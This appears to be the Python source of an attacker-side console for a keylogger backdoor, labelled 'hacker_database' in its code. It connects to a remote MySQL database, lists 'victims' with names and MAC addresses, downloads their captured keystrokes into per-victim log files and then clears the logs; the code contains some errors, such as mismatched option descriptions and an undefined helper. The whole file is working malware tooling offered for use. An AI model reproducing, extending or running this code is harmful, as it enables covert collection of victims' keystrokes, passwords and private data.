
from libs.colors import COLORS
from subprocess import check_output, CalledProcessError, call
from os import devnull
from terminaltables import AsciiTable
from mysql.connector import connect
from socket import socket, AF_INET, SOCK_DGRAM


devnull = open(devnull, 'w')
colors = COLORS()

global program_path
global activated_option


def print_backdoor_listener_options(inputs_dict):
    descriptions = {
        'LPORT':'This is the name of the final executable',
        'LHOST': 'This is the program ID of the virus',
        'P_ID': 'Number of seconds it sleeps during work'
    }

    print(colors.RESET, end='')
    table_data = [[f'{colors.BOLD}Option', f'{colors.BOLD}Current Setting', f'{colors.BOLD}Description{colors.RESET}']]
    for item in inputs_dict:
        try:
            single_data = [str(item), str(inputs_dict[item]), descriptions[item]]
            table_data.append(single_data)
        except KeyError as fuck:
            pass
    table = AsciiTable(table_data)
    print(table.table, end='\n\n')


def update_setting(setting, new_value, save_values):
    save_values[setting] = new_value
    return save_values


def read_credential_file(program_path):
    credentials = {}
    with open(program_path + '/data/database_credentials.txt', 'r') as credential_file:
        while True:
            content_line = credential_file.readline()
            if not content_line:
                break

            if content_line[-1] == '\n':
                content_line = content_line[:-1]

            if len(content_line) > 0:
                key, content = content_line.split('=')
                credentials[key] = content

    return credentials


def show_victim_data():
    global program_path

    try:
        credentials = read_credential_file(program_path)
        sql_database = connect(
            host     = credentials['Server'],
            user     = credentials['Username'],
            passwd   = credentials['Password'],
            database = credentials['Database'],
            port     = credentials['Port']
        )

        my_cursor = sql_database.cursor()
        command = 'SELECT * FROM `users`'
        my_cursor.execute(command)
        
        data = list(map(list,my_cursor.fetchall()))

        header = [[colors.BOLD + 'P_ID', 'Name', 'MAC address', 'Selected' + colors.RESET]]

        table = AsciiTable(header + data)
        print(table.table)

        print(colors.RESET, end='\n\n')
        


    except Exception as error:
        print(colors.Red + '[✘]Error occured during the proccess')
        print('[✘]{}'.format(error) + colors.RESET)


def read_online_keys():
    try:
        global program_path
        credentials = read_credential_file(program_path)

        try:

            hacker_database = connect(
                host     = credentials['Server'],
                user     = credentials['Username'],
                passwd   = credentials['Password'],
                database = credentials['Database'],
                port     = credentials['Port']
            )

            # reading the data base
            my_cursor = hacker_database.cursor()
            command = "SELECT * FROM `key_logs`"
            my_cursor.execute(command)
            data = my_cursor.fetchall()

            report = extract_write_data(data)
            heading = ['P_ID', 'MAC_ADDR', 'LOG stat', 'Process stat']

            draw_table(heading, report)

            # clear the data base
            command = "UPDATE `key_logs` SET `keys` = ''"
            my_cursor.execute(command)

            print(colors.Green + '\n[✔]Database cleared\n' + colors.RESET)

            hacker_database.commit()

        except Exception as e:
            print(colors.Red + '[✘]Error occurred while connecting to the database')
            print(colors.Red + '[✘]' + e + colors.RESET)
            exit(0)

    except:
        print(colors.Red + '[✘]Error reading credentials' + colors.RESET)
        exit(0)


def extract_write_data(data_list):
    global program_path
    try:
        call(f"mkdir '{program_path}'/keylogs", shell=True)
    except:
        pass

    print('\n' + colors.Cyan + '[✔]Directory keylogs created')
    print(colors.Cyan + '[✔]Processing data' + colors.RESET, end='')

    # crete a empty list to append process report
    extract_report = []

    for row in data_list:

        p_id = row[0]
        mac_address = row[1]
        one_row_report = [p_id, mac_address]

        try:
            log = row[2]
            if len(log) > 0:
                one_row_report.append(colors.Green + 'LOGGED' + colors.RESET)
                with open(f"{program_path}/keylogs/p_id_{p_id}.txt", 'a') as log_file:
                    log_file.write('\n\n\n\n\n')
                    log_file.write(log)

            else:
                one_row_report.append(colors.Red + 'NO LOG' + colors.RESET)

            one_row_report.append('Completed')

        except Exception as error:
            while len(one_row_report) < 3:
                one_row_report.append('')
            print(error)
            one_row_report.append('Error')

        extract_report.append(one_row_report)

    return extract_report


def draw_table(heading, data):
    print('\n\n' + colors.BOLD + colors.ULINE + "Report of Key logger data" + colors.RESET)

    real_data = [heading]
    real_data.extend(data)

    table = AsciiTable(real_data)
    print(table.table)


def activate_listener():
    # from the begining used command line interface
    global activated_option

    s = socket(AF_INET, SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    private_ip = s.getsockname()[0]
    s.close()


    saved_inputs_dict = {
        'LPORT':'4343',
        'LHOST': private_ip,
        'P_ID': '1'
    }

    while True:
        # get the command from the user
        command = input("".join(activated_option) + ' > ')

        if command == 'show victims':
            show_victim_data()

        elif command == 'clear':
            call('clear', shell=True)

        elif command == 'extract':
            read_online_keys()

        elif command == 'exit' or command == 'quit':
            activated_option.remove(' {}listen({}Backdoor{}{}){}'.format(colors.BOLD, colors.Red, colors.RESET, colors.BOLD, colors.RESET))
            break

        elif command == 'help':
            logo_printer.print_help()

        elif command == '' or command == ' ':
            pass

        # if the command is show options then show options
        elif command == 'show options' or command == 'options':
            print_backdoor_listener_options(saved_inputs_dict)

        # if the command is set then update the settings wales
        elif command.split()[0] == 'set':
            setting = command.split()[1]
            new_value = command.split()[2]
            saved_inputs_dict = update_setting(setting, new_value, saved_inputs_dict)

        else:
            print(colors.Red + '[✘]Invalid comand' + colors.RESET)


activate_listener()